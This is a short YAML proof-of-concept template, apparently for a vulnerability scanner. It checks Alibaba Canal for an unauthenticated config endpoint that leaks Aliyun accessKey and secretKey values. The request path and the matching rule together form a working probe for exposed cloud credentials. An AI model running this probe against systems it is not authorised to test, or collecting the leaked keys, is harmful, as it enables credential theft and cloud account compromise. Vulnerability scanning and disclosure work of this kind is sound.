detail:
  author: Aquilao(https://github.com/Aquilao)
  info: alibaba Canal info leak
  links:
  - https://my.oschina.net/u/4581879/blog/4753320
expression: r0()
manual: true
name: poc-yaml-alibaba-canal-info-leak
rules:
  r0:
    expression: response.status == 200 && response.content_type.icontains("application/json")
      && response.body.bcontains(b"ncanal.aliyun.accessKey") && response.body.bcontains(b"ncanal.aliyun.secretKey")
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /api/v1/canal/config/1/1
transport: http
